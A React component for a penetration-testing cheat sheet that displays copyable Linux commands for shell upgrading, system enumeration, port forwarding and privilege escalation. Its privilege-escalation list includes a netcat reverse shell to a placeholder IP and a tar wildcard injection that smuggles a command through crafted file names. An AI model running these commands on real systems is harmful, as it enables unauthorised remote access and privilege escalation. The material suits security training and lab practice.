import React, { useState } from 'react';
import { Card, Button, TabNav, PayloadBlock } from '../ui';
import { Terminal, Copy, Check } from 'lucide-react';

export default function LinuxEnumTool() {
    const [activeTab, setActiveTab] = useState('tty');
    const [showToast, setShowToast] = useState(false);

    const tabs = [
        { id: 'tty', label: 'TTY Shell' },
        { id: 'enum', label: 'Enumeration' },
    ];

    const copyToClipboard = (text: string) => {
        navigator.clipboard.writeText(text);
        setShowToast(true);
        setTimeout(() => setShowToast(false), 2000);
    };

    const TTY_METHODS = [
        { title: 'Python PTY', cmd: 'python3 -c \'import pty;pty.spawn("/bin/bash")\'' },
        { title: 'Python3 PTY', cmd: 'python3 -c \'import pty;pty.spawn("/bin/sh")\'' },
        { title: 'Perl', cmd: 'perl -e \'exec "/bin/sh";\'' },
        { title: 'Ruby', cmd: 'ruby -e \'exec "/bin/sh"\'' },
        { title: 'Lua', cmd: 'lua -e \'os.execute("/bin/sh")\'' },
        { title: 'AWK', cmd: 'awk \'BEGIN {system("/bin/sh")}\'' },
        { title: 'socat', cmd: 'socat file:`tty`,raw,echo=0 tcp-listen:4444' },
        { title: 'Script', cmd: 'script -qc /bin/bash /dev/null' },
    ];

    const TTY_STABILIZATION = [
        { step: '1. Spawn PTY', cmd: 'python3 -c \'import pty;pty.spawn("/bin/bash")\'' },
        { step: '2. Set Terminal', cmd: 'export TERM=xterm' },
        { step: '3. Background (Ctrl+Z)', cmd: '^Z' },
        { step: '4. Foreground with raw', cmd: 'stty raw -echo; fg' },
        { step: '5. Reset (if needed)', cmd: 'reset' },
        { step: '6. Set terminal size', cmd: 'stty rows 38 columns 116' },
    ];

    const LINUX_ENUM = {
        suid: [
            { desc: 'Find SUID binaries', cmd: 'find / -user root -perm /4000 2>/dev/null' },
            { desc: 'Find SUID files', cmd: 'find / -perm -u=s -type f 2>/dev/null' },
            { desc: 'Find writable SUID', cmd: 'find / -user root -perm -4000 -exec ls -ldb {} \\; > /tmp/suid' },
            { desc: 'Find capabilities', cmd: 'getcap -r / 2>/dev/null' },
        ],
        system: [
            { desc: 'OS Version', cmd: 'cat /etc/issue' },
            { desc: 'OS Release', cmd: 'cat /etc/*-release' },
            { desc: 'LSB Release', cmd: 'cat /etc/lsb-release' },
            { desc: 'RedHat Release', cmd: 'cat /etc/redhat-release' },
        ],
        kernel: [
            { desc: 'Kernel Version', cmd: 'cat /proc/version' },
            { desc: 'Uname All', cmd: 'uname -a' },
            { desc: 'Uname Minimal', cmd: 'uname -mrs' },
            { desc: 'Kernel Package', cmd: 'rpm -q kernel' },
            { desc: 'DMesg Linux', cmd: 'dmesg | grep Linux' },
            { desc: 'Boot Kernels', cmd: 'ls /boot | grep vmlinuz' },
        ],
        env: [
            { desc: 'Profile', cmd: 'cat /etc/profile' },
            { desc: 'Bashrc (Global)', cmd: 'cat /etc/bashrc' },
            { desc: 'Bash Profile', cmd: 'cat ~/.bash_profile' },
            { desc: 'Bashrc (User)', cmd: 'cat ~/.bashrc' },
            { desc: 'Bash Logout', cmd: 'cat ~/.bash_logout' },
            { desc: 'Environment', cmd: 'env' },
            { desc: 'Set Variables', cmd: 'set' },
        ],
        services: [
            { desc: 'Syslog Config', cmd: 'cat /etc/syslog.conf' },
            { desc: 'Apache2 Config', cmd: 'cat /etc/apache2/apache2.conf' },
            { desc: 'httpd Config', cmd: 'cat /etc/httpd/conf/httpd.conf' },
            { desc: 'MySQL Config', cmd: 'cat /etc/my.conf' },
            { desc: 'Readable /etc/', cmd: 'ls -aRl /etc/ | awk \'$1 ~ /^.*r.*/\'' },
        ],
        cron: [
            { desc: 'User Crontab', cmd: 'crontab -l' },
            { desc: 'Cron Spool', cmd: 'ls -alh /var/spool/cron' },
            { desc: 'Cron Files', cmd: 'ls -al /etc/ | grep cron' },
            { desc: 'All Cron', cmd: 'ls -al /etc/cron*' },
            { desc: 'Crontab', cmd: 'cat /etc/crontab' },
            { desc: 'Anacrontab', cmd: 'cat /etc/anacrontab' },
            { desc: 'Root Cron', cmd: 'cat /var/spool/cron/crontabs/root' },
        ],
        network: [
            { desc: 'Open Ports', cmd: 'netstat -tulpn' },
            { desc: 'Active Connections', cmd: 'netstat -antup' },
            { desc: 'LSOF All', cmd: 'lsof -i' },
            { desc: 'LSOF Port 80', cmd: 'lsof -i :80' },
            { desc: 'Last Logins', cmd: 'last' },
            { desc: 'Last Log', cmd: 'lastlog' },
        ],
        forwarding: [
            { desc: 'SSH Local Forward', cmd: 'ssh -L 8080:127.0.0.1:80 root@192.168.1.7' },
            { desc: 'SSH Remote Forward', cmd: 'ssh -R 8080:127.0.0.1:80 root@192.168.1.7' },
            { desc: 'Netcat Relay', cmd: 'mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe' },
        ],
        privesc: [
            { desc: 'TAR Wildcard 1', cmd: 'echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 1234 >/tmp/f" > shell.sh' },
            { desc: 'TAR Wildcard 2', cmd: 'touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"' },
            { desc: 'TAR Wildcard 3', cmd: 'touch "/var/www/html/--checkpoint=1"' },
        ],
    };

    return (
        <div className="space-y-6">
            <div>
                <h2 className="text-2xl font-black text-white flex items-center gap-2">
                    <Terminal className="text-htb-green" size={24} />
                    Linux Commands
                </h2>
                <p className="text-gray-400">
                    TTY shell upgrade techniques and comprehensive Linux enumeration
                </p>
            </div>

            <TabNav tabs={tabs} activeTab={activeTab} onTabChange={setActiveTab} />

            {/* TTY Shell Tab */}
            {activeTab === 'tty' && (
                <div className="space-y-4">
                    <Card className="!p-6 bg-blue-500/10 border-blue-500/20">
                        <h3 className="text-lg font-bold text-blue-400 mb-2">Shell Stabilization Steps</h3>
                        <p className="text-sm text-gray-400 mb-4">
                            Upgrade a basic shell to a fully interactive TTY shell with tab completion and Ctrl+C support
                        </p>
                        <div className="space-y-4">
                            {TTY_STABILIZATION.map((item, idx) => (
                                <div key={idx} className="flex items-start gap-3">
                                    <div className="bg-blue-500 text-white text-xs font-bold rounded-full w-6 h-6 flex items-center justify-center flex-shrink-0 mt-2">
                                        {idx + 1}
                                    </div>
                                    <div className="flex-1">
                                        <p className="text-xs text-gray-400 mb-1 font-bold">{item.step}</p>
                                        <PayloadBlock content={item.cmd} />
                                    </div>
                                </div>
                            ))}
                        </div>
                    </Card>

                    <h3 className="text-lg font-bold text-white">TTY Spawn Methods</h3>
                    <PayloadBlock
                        content={TTY_METHODS.map(item => `# ${item.title}\n${item.cmd}`).join('\n\n')}
                    />
                </div>
            )}

            {/* Enumeration Tab */}
            {activeTab === 'enum' && (
                <div className="space-y-6">
                    <div>
                        <h3 className="text-lg font-bold text-white mb-3">SUID / Capabilities</h3>
                        <PayloadBlock
                            content={LINUX_ENUM.suid.map(item => `# ${item.desc}\n${item.cmd}`).join('\n\n')}
                        />
                    </div>

                    <div>
                        <h3 className="text-lg font-bold text-white mb-3">System Version</h3>
                        <PayloadBlock
                            content={LINUX_ENUM.system.map(item => `# ${item.desc}\n${item.cmd}`).join('\n\n')}
                        />
                    </div>

                    <div>
                        <h3 className="text-lg font-bold text-white mb-3">Kernel Information</h3>
                        <PayloadBlock
                            content={LINUX_ENUM.kernel.map(item => `# ${item.desc}\n${item.cmd}`).join('\n\n')}
                        />
                    </div>

                    <div>
                        <h3 className="text-lg font-bold text-white mb-3">Environment Variables</h3>
                        <PayloadBlock
                            content={LINUX_ENUM.env.map(item => `# ${item.desc}\n${item.cmd}`).join('\n\n')}
                        />
                    </div>

                    <div>
                        <h3 className="text-lg font-bold text-white mb-3">Service Configurations</h3>
                        <PayloadBlock
                            content={LINUX_ENUM.services.map(item => `# ${item.desc}\n${item.cmd}`).join('\n\n')}
                        />
                    </div>

                    <div>
                        <h3 className="text-lg font-bold text-white mb-3">Cron Jobs</h3>
                        <PayloadBlock
                            content={LINUX_ENUM.cron.map(item => `# ${item.desc}\n${item.cmd}`).join('\n\n')}
                        />
                    </div>

                    <div>
                        <h3 className="text-lg font-bold text-white mb-3">Network & Users</h3>
                        <PayloadBlock
                            content={LINUX_ENUM.network.map(item => `# ${item.desc}\n${item.cmd}`).join('\n\n')}
                        />
                    </div>

                    <div>
                        <h3 className="text-lg font-bold text-white mb-3">Port Forwarding</h3>
                        <PayloadBlock
                            content={LINUX_ENUM.forwarding.map(item => `# ${item.desc}\n${item.cmd}`).join('\n\n')}
                        />
                    </div>

                    <div>
                        <h3 className="text-lg font-bold text-white mb-3">Privilege Escalation</h3>
                        <PayloadBlock
                            content={LINUX_ENUM.privesc.map(item => `# ${item.desc}\n${item.cmd}`).join('\n\n')}
                        />
                    </div>
                </div>
            )}

            {/* Toast */}
            <div
                className={`fixed bottom-6 left-1/2 transform -translate-x-1/2 bg-[#0d1117] border-2 border-[#a2ff00] px-6 py-4 rounded-xl flex items-center gap-3 shadow-2xl shadow-[#a2ff00]/20 transition-all duration-300 ${showToast ? 'translate-y-0 opacity-100' : 'translate-y-20 opacity-0 pointer-events-none'}`}
                style={{ zIndex: 9999 }}
            >
                <div className="bg-[#a2ff00] rounded-full p-1.5 text-black">
                    <Check size={16} strokeWidth={3} />
                </div>
                <span className="font-bold text-sm text-white">Copied to clipboard!</span>
            </div>
        </div>
    );
}
